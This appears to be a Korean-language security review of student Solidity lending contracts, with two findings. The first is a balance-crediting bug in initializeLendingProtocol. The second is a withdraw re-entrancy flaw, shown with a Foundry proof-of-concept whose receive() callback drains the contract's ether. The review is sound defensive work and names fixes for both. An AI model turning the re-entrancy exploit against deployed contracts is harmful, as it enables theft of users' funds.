## 1. initializeLendingProtocol 함수 구현 오류

### 설명
[DreamAcademyLending.sol 127-128행](https://github.com/dlanaraa/Lending_solidity/blob/55071b255a24d87517629b1d37672bc4ab580acc/src/DreamAcademyLending.sol#L127-L128)에서 특정 account에 대한 잔고를 보관하는 변수인 _depositETH와 _depositUSDC의 값을 동시에 누적시키고 있어서

실제로는 address(0x0) 의 reserve만 보냈더라도 잔고에는 _depositUSDC까지 올라가는 결과가 발생하여, withdraw함수에서 인출 가능합니다.

### 파급력
심각도는 Critical로써 사용자는 ether 혹은 usdc만 initializeLendingProtocol함수를 통해 실제 예치하지 않은 컨트랙트 내의 다른 토큰을 withdraw 할 수 있게되거나 borrow를 통해 비정상적으로 다른 토큰을 빌려갈 수 있습니다.

### 해결방안
해당 함수가 external 이기때문에 함수 내부에서 require로 컨트랙트의 admin 만 호출 가능하게하고, 그게 아니면 실제 입금한 자산에 대해서만 잔고를 올리도록 해야합니다.

### 해당 취약점 발견된 목록
* [dlanaraa/Lending_solidity](https://github.com/dlanaraa/Lending_solidity/blob/55071b255a24d87517629b1d37672bc4ab580acc/src/DreamAcademyLending.sol#L127-L128)
* [seonghwi-lee/Lending](https://github.com/seonghwi-lee/Lending/blob/9f93e626f86beb865f0eec63a68dd4f18a4686f7/src/DreamAcademyLending.sol#L44)
* [jun4n/Lending_solidity](https://github.com/jun4n/Lending_solidity/blob/fd3baab9a9c6384e6dfb767c23ce2f81cc1de913/src/DreamAcademyLending.sol#L125)

## 2. withdraw에서 call 사용하여 ether 반환할때 re-entrancy 취약점

### 설명
[DreamAcademyLending.sol 130행](https://github.com/Namryeong-Kim/Lending_solidity/blob/a732de5c30b9c0ca9ee12cccbbf4d6a267432d30/src/DreamAcademyLending.sol#L130)에서 call을 사용하여 ether를 전송하는데, 대상 account가 CA 인경우에 해당 CA에 구현된 receive에서 여러번 withdraw를 호출하면 Lending contract의 ether잔고를 (특정 account가 입금한 양보다 더 많이)인출 할 수 있다.

```
function testWithdrawAtt() external {
    vm.deal(address(lending), 30 ether); // 비교를 위해 Lending컨트랙트의 잔고를 30으로 맞춰둔다.
    lending.deposit{value: 1 ether}(address(0x0), 1 ether); // 공격 CA는 단 1 ether만 deposit
    vm.deal(address(this), 0 ether);
    console.log("Lending: balance before withdraw: %d", address(lending).balance); // 원래있던 30 ether + 공격자 1 ether deposit 해서 31 ether
    lending.withdraw(address(0x0), 1 ether);
    console.log("Lending: balance after withdraw: %d", address(lending).balance); // 0 ether
    console.log("Attacker: balance after withdraw", address(this).balance); // 31 ether
}

receive() external payable {
    if(address(lending).balance >= 1 ether){
        lending.withdraw(address(0x0), 1 ether);
    }
}
```

### 파급력

심각도는 Critical로써 공격자가 Lending 컨트랙트의 모든 ether 잔고를 할 수 있거나 대출을 repay하지 않고 담보를 인출해 갈 수 있습니다.

### 해결방안
withdraw 함수 구현을 Checks Effects Interaction Pattern으로 변경해야합니다. [133행](https://github.com/Namryeong-Kim/Lending_solidity/blob/a732de5c30b9c0ca9ee12cccbbf4d6a267432d30/src/DreamAcademyLending.sol#L133)을 129행과 130행 사이로 이동시키면 됩니다.

### 해당 취약점 발견된 목록
* [Namryeong-Kim/Lending_solidity](https://github.com/Namryeong-Kim/Lending_solidity/blob/a732de5c30b9c0ca9ee12cccbbf4d6a267432d30/src/DreamAcademyLending.sol#L130)
* [2-Sunghoon-Moon/Lending_solidity](https://github.com/2-Sunghoon-Moon/Lending_solidity/blob/bd5fab0c28da7b02a0f79c7a86c5f87b0b443dbf/src/DreamAcademyLending.sol#L280)
* [seonghwi-lee/Lending](https://github.com/seonghwi-lee/Lending/blob/9f93e626f86beb865f0eec63a68dd4f18a4686f7/src/DreamAcademyLending.sol#L207)
